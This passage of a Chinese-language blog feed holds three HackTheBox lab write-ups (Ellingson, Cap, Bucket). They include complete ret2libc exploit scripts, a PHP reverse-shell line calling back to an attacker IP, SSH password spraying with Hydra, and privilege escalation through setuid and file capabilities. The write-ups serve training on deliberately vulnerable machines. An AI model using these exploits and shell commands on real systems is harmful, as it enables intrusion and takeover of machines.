ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\n然后我们运行，但是权限只是 `margo`的权限\n\n```bash\n$ $ id\nuid=1002(margo) gid=1002(margo) groups=1002(margo)\n```\n\n### GetRootShell\n\n我们还需要进行将`shell`权限提升，可以使用`setuid`\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym['setuid']\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n```\n\n运行获得 `RootShell`\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n# $ id\nuid=0(root) gid=1002(margo) groups=1002(margo)\n```\n\n```bash\n# $ cat /root/root.txt\nd87f7aac2d13c429b8d30e11be174dd6\n```\n\n## 总结\n\n爽。\n\n打到缓冲区溢出无从下手，花了一天多时间恶补`ROP` ，然后一命通关\n\n太爽了。\n\n![image.gif](/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif)\n",
            "url": "https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson",
            "title": "HackTheBox - Machine - Ellingson",
            "summary": "Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon 访问HTTP 内容告诉我们他们被Ellingson病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被ban (目录扫描也不行...",
            "date_modified": "2025-06-15T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux",
                "PWN",
                "ret2libc",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap",
            "content_html": "\n# Machine - Cap\n\n> https://app.hackthebox.com/machines/Cap | `Linux` | `Easy`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image.png)\n\n大名鼎鼎的`Cap`，新手关\n\n## Recon\n\n`nmap`端口扫描\n\n```bash\n➜  Cap nmap -sT -min-rate 5000 10.10.10.245    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report for 10.10.10.245\nHost is up (0.072s latency).\nNot shown: 701 closed tcp ports (conn-refused), 296 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.81 seconds\n```\n\n```bash\n➜  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report for 10.10.10.245\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n80/tcp open  http    Gunicorn\n|_http-title: Security Dashboard\n|_http-server-header: gunicorn\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   110.57 ms 10.10.16.1\n2   55.69 ms  10.10.10.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.50 seconds\n```\n\n有`FTP`服务的存在，我们首先枚举`FTP` ，但是并不支持匿名用户访问\n\n```bash\n➜  Cap ftp 10.10.10.245\nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n```\n\n访问 `HTTP` ，一个后台管理的模板\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image1.png)\n\n有一些很有趣的功能\n\n在 `/data/3` 中能下载一个 `pcap`文件\n\n`/ip` 能看到`ip add` 命令执行的结果\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image2.png)\n\n`/netstat` 中能发现端口和进程信息\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image3.png)\n\n发现了一个有趣的点 `/data/x` 是会增加的，能观察到最大是到`9`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image4.png)\n\n## IDOR - 不安全的直接对象引用\n\n下载的`pcap`文件貌似是一段时间内通过的流量，我们一直`ping` ，等待它更新，更新后我们将`pcap`文件下载下来打开，能确定就是它捕获的流量\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image5.png)\n\n可以尝试一直下载 `pcap` 文件，捕捉下载时的流量\n\n```bash\n➜  Cap for i in {0..9};do curl 10.10.10.245/download/${i} --output ${i}.pcap;sleep 1;done\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image6.png)\n\n当我们分析到`0.pcap`文件的时候，能发现捕捉到了`FTP`的包，这在其他`>1.pacp`的数据包中是没有的\n\n所以这里出现了应用逻辑上的错误，敏感信息泄露 (Sensitive Information Disclosure)，不安全的直接对象引用 (Insecure Direct Object Reference - IDOR)\n\n并且后端代码中可能是：\n\n```bash\ndef download_file(i):\n    # 当 i=0 时，有一个特殊处理，可能用于调试或测试\n    if i == 0:\n        file_path = \"/var/log/debug/ftp_capture.pcap\" # 指向了一个开发/运维人员留下的调试文件\n    else:\n        # 正常逻辑\n        file_path = f\"/var/www/downloads/file_{i}.data\"\n    # 检查文件是否存在并返回给用户\n    if file_exists(file_path):\n        return send_file(file_path)\n    else:\n        return \"File not found\"\n```\n\n然后我们得到了它\n\n并且`FTP`数据包中带有`nathan`用户的凭据，`nathan:Buck3tH4TF0RM3!`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image7.png)\n\n凭据可以进去到 `FTP`\n\n```bash\n➜  Cap ftp 10.10.10.245                                                                  \nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): nathan\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> dir\n229 Entering Extended Passive Mode (|||24592|)\n150 Here comes the directory listing.\n-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html\ndrwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap\n-r--------    1 1001     1001           33 Jun 10 19:39 user.txt\n226 Directory send OK.\n```\n\n也可以进行 `SSH` 登录\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image8.png)\n\n当前家目录下可以读取`user.txt`\n\n```bash\nnathan@cap:~$ cat user.txt \nc5a3b7e60be43d07acb3580714228ee7\n```\n\n## 权限提升\n\n运行`Web`的`app.py` 里面的信息很有趣，`setuid(0)`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image9.png)\n\n但是我们可以注意到是以`nathan`权限运行的，那么`setuid(0)` 要怎么才能有效呢？\n\n```bash\nnathan@cap:/var/www/html$ ls -al\ntotal 32\ndrwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .\ndrwxr-xr-x 3 root   root   4096 May 23  2021 ..\ndrwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__\n-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py\ndrwxr-xr-x 6 root   root   4096 May 23  2021 static\ndrwxr-xr-x 2 root   root   4096 May 23  2021 templates\ndrwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload\n```\n\n我们直接运行`python` ，直接就能拿到 `root` 权限了\n\n```bash\nnathan@cap:/var/www/html$ python3\npython3           python3-config    python3.8         python3.8-config  \nnathan@cap:/var/www/html$ python3.8\nPython 3.8.5 (default, Jan 27 2021, 15:41:15) \n[GCC 9.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import os;os.setuid(0)\n>>> os.system(id)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method\n>>> os.system('id')\nuid=0(root) gid=1001(nathan) groups=1001(nathan)\n0\n>>> os.system('chmod +s /bin/bash')\n0\n```\n\n```bash\nbash-5.0# cat root.txt \n6b21801e0d9e7354cfa2de802cf89dcd\n```\n\n通过 `getcap` 命令也能知道为什么会有该权限\n\n```bash\nnathan@cap:/var/www/html$ which python3\n/usr/bin/python3\nnathan@cap:/var/www/html$ which python3.8\n/usr/bin/python3.8\nnathan@cap:/var/www/html$ getcap /usr/bin/python3\nnathan@cap:/var/www/html$ getcap /usr/bin/python3.8\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n```",
            "url": "https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap",
            "title": "HackTheBox - Machine - Cap",
            "summary": "Machine Cap https://app.hackthebox.com/machines/Cap | Linux | Easy 大名鼎鼎的Cap，新手关 Recon nmap端口扫描 有FTP服务的存在，我们首先枚举FTP ，但是并不支持匿名用户访问 访问 HTTP ，一个后台管理的模板 有一...",
            "date_modified": "2025-06-11T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux",
                "Capabilities",
                "IDOR"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket",
            "content_html": "\n# Machine - Bucket\n\n> https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image.png)\n\n## Recon\n\n端口扫描\n\n```bash\n➜  Bucket nmap -sT -min-rate 5000 10.10.10.212\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST\nNmap scan report for bucket.htb (10.10.10.212)\nHost is up (0.086s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.51 seconds\n```\n\n```bash\n➜  Bucket nmap -sT -A -p 22,80 10.10.10.212                             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST\nNmap scan report for bucket.htb (10.10.10.212)\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   108.02 ms 10.10.16.1\n2   54.68 ms  bucket.htb (10.10.10.212)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.14 seconds\n```\n\n访问 `HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image1.png)\n\n主页上没有一点信息，对目录进行爆破\n\n```bash\n➜  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://bucket.htb/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 403]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     \n🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_bucket_htb_-1749173567.state ...\n[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     \n[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         \n```\n\n但是我注意到源代码中的图片是通过子域名`http://s3.bucket.htb` 中获取的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image2.png)\n\n将其添加到 `hosts`，并访问，只显示 `running`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image3.png)\n\n网上搜索 `s3` 大部分都是 `AWS S3` ，所以假定这是一个 `AWS S3` 实例\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image4.png)\n\n跑一下目录扫描，能找到两个子目录\n\n```bash\n➜Bucket gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://s3.bucket.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/health               (Status: 200) [Size: 54]\n/shell                (Status: 200) [Size: 0]\n/server-status        (Status: 403)\n```\n\n## AWS S3\n\n> 关于AWS S3 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\n> \n\n根据手册，`adserver`是一个存储桶，`images/bug.jpg` 是对象键，`http://s3.bucket.htb` 是端点\n\n访问 `/shell` 会被重定向到一个奇怪的`URL`，看起来只像是只有内网可以访问\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image5.png)\n\n访问 `/health` 发现除了 s3 还运行着 `dynamodb`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image6.png)\n\n> 关于 Dynamodb https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\n> \n\n从文档上看，Dynamodb 和 S3 都可以使用 Amazon CLI 来访问，并且两个应用都是可以集成的\n\n### Dynamodb\n\n访问`Dynamodb`前，要先配置  `aws-cli`\n\nPS：官方配置需要 Access ID，并且注册需要信用卡，以为差点无了，看了下WP才知道可以瞎填\n\n```bash\n➜  Bucket aws configure           \nAWS Access Key ID [None]: sunsetaction\nAWS Secret Access Key [None]: sunsetaction\nDefault region name [None]: CN\nDefault output format [None]: json\n```\n\n列出所有表\n\n```bash\n➜  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb\n{\n    \"TableNames\": [\n        \"users\"\n    ]\n}\n```\n\n查询表的数据，可以得到几个用户凭据\n\n```bash\n➜  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name users\n{\n    \"Items\": [\n        {\n            \"password\": {\n                \"S\": \"Management@#1@#\"\n            },\n            \"username\": {\n                \"S\": \"Mgmt\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"Welcome123!\"\n            },\n            \"username\": {\n                \"S\": \"Cloudadm\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"n2vM-<_K_Q:.Aa2\"\n            },\n            \"username\": {\n                \"S\": \"Sysadm\"\n            }\n        }\n    ],\n    \"Count\": 3,\n    \"ScannedCount\": 3,\n    \"ConsumedCapacity\": null\n}\n```\n\n将其拿去对`ssh`进行碰撞，但是无结果，貌似也能对数据进行写入，但是现在也没用\n\n### 文件上传\n\n我们通过文档 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html 可以知道存在 `aws s3 ls` 命令，该命令作用是将在单个非分页调用中列出您账户中的所有通用存储桶。\n\n```bash\n➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls\n2025-06-06 15:06:03 adserver\n```\n\n命令结果是我们和`images` 在同一目录下\n\n我们查看帮助还能看到 `cp` 命令，那么代表可能可以对文件进行上传\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image7.png)\n\n我们上传一个文件测试一下\n\n```bash\n➜  Bucket echo '<?php phpinfo();?>' > test.php                                                                                                                         \n\n➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 cp test.php s3://adserver/test.php\nupload: ./test.php to s3://adserver/test.php \n```\n\n可以上传，但是貌似无法解析\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image8.png)\n\n这里看了下`WP`，之前进行目录扫描`s3`的时候能扫描到`/server-status` ，那么该处和`bucket.htb`可能在同一目录下，而且可以支持解析 `php` 拓展名\n\n在 `adserver` 目录下没有\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image9.png)\n\n这里通过 `ls` 命令来查看 `adserver`文件夹内的文件，可以看到存在`index.html` ，那么可能就是主站\n\n```bash\n➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver                    \n                           PRE images/\n2025-06-06 15:48:02       5344 index.html\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image10.png)\n\n进行反弹 `shell`\n\n```bash\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.69/1234 0>&1'\");?>\n```\n\n和之前一样的操作可以直接获得弹回来的 `shell`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image11.png)\n\n## 权限提升\n\n### 密码碰撞\n\n发现存在用户`roy`\n\n```bash\nwww-data@bucket:/var/www$ ls /home\nroy\n```\n\n我们使用的到的密码进行碰撞\n\n```bash\n➜  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task\n[DATA] attacking ssh://10.10.10.212:22/\n[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06\n```\n\n成功得到 `Roy`的`shell`\n\n```bash\n➜  Bucket ssh roy@10.10.10.212   \nroy@10.10.10.212's password: \nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 06 Jun 2025 07:52:46 AM UTC\n\n  System load:                      0.05\n  Usage of /:                       33.9% of 17.59GB\n  Memory usage:                     30%\n  Swap usage:                       0%\n  Processes:                        256\n  Users logged in:                  2\n  IPv4 address for br-bee97070fb20: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for ens160:          10.10.10.212\n  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55\n\n229 updates can be installed immediately.\n103 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Jun  6 06:08:21 2025 from 10.10.16.27\nroy@bucket:~$ \n```\n\n当前目录下能得到 `user.txt`\n\n```bash\nroy@bucket:~$ cat user.txt\n6e375b41aac41437da7b58d400a30c74\n```\n\n### 信息收集\n\n`db.php`\n\n```bash\nroy@bucket:~/project$ cat db.php\n<?php\nrequire 'vendor/autoload.php';\ndate_default_timezone_set('America/New_York');\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n$client = new Aws\\Sdk([\n    'profile' => 'default',\n    'region'  => 'us-east-1',\n    'version' => 'latest',\n    'endpoint' => 'http://localhost:4566'\n]);\n\n$dynamodb = $client->createDynamoDb();\n\n//todo\n```\n\n内部开放了好几个端口\n\n```bash\nroy@bucket:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process\nudp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*\ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*\ntcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*\ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*\ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*\n```\n\n我们将 `4566`和 `8000`端口转发出去\n\n```bash\nroy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &\n[1] 145731\nroy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &\n[2] 145736\n```\n\n其中 `8000`端口是貌似未完工的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image12.png)\n\n`4566`像是`s3`的端点\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image13.png)\n\n尝试通过`aws`访问\n\n```bash\n➜  Bucket aws --endpoint-url http://bucket.htb:4567 s3 ls\n2025-06-06 16:04:01 adserver\n```\n\n可能是一个内部端点，尝试读取数据库\n\n```bash\n➜  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n{\n    \"TableNames\": [\n        \"Music\",\n        \"users\"\n    ]\n}\n```\n\n`users`和我们在外部端点访问的一样，`Music`是空的（可能其他人使用官方文档中的语句创建的），感觉就是之前的外部端点\n\n### To root\n\n回到`8000`端口，我们发现这是一个不小的项目，线路也可能在这里\n\n```bash\nroy@bucket:/var/www/bucket-app$ ls\ncomposer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor\n```\n\n```bash\nroy@bucket:/var/www$ getfacl bucket-app/\n# file: bucket-app/\n# owner: root\n# group: root\nuser::rwx\nuser:roy:r-x\ngroup::r-x\nmask::r-x\nother::---\n```\n\n`index.php`\n\n```bash\nroy@bucket:/var/www/bucket-app$ cat index.php\n<?php\nrequire 'vendor/autoload.php';\nuse Aws\\DynamoDb\\DynamoDbClient;\nif($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {\n        if($_POST[\"action\"]===\"get_alerts\") {\n                date_default_timezone_set('America/New_York');\n                $client = new DynamoDbClient([\n                        'profile' => 'default',\n                        'region'  => 'us-east-1',\n                        'version' => 'latest',\n                        'endpoint' => 'http://localhost:4566'\n                ]);\n\n                $iterator = $client->getIterator('Scan', array(\n                        'TableName' => 'alerts',\n                        'FilterExpression' => \"title = :title\",\n                        'ExpressionAttributeValues' => array(\":title\"=>array(\"S\"=>\"Ransomware\")),\n                ));\n\n                foreach ($iterator as $item) {\n                        $name=rand(1,10000).'.html';\n                        file_put_contents('files/'.$name,$item[\"data\"]);\n                }\n                passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");\n        }\n}\nelse\n{\n?>\n```\n\n逻辑大概是通过`POST`方法访问，并且参数`action`等于`get_alerts` 时，对数据进行连接，然后循环`alerts`表并筛选表达式中 `:title` 占位符的值，这里为 \"`Ransomware`\"。再下面的循环上边筛选后的值，生成一个1到10000之间的随机数，并附加 `.html` 后缀，作为 HTML 文件名，并将筛选后的值的`data`写入`HTML` 文件。暗示了你的 DynamoDB `alerts` 表中的项目的 `data` 属性存储的是 HTML 内容。\n\n最后一行，调用了`pd4ml_demo.jar` ，提供用于 HTML 到 PDF 转换的基本 Java API，包括 PD4ML JSP 标签库。\n\n那么最后一句就是将生成`HTML`文件钻换成`PDF`文件，并存放在`files/result.pdf`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image14.png)\n\n我们观察`files`文件夹没有任何文件产生，应该是表`alerts`不存在，我们首先创建`alerts`表\n\n```bash\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url 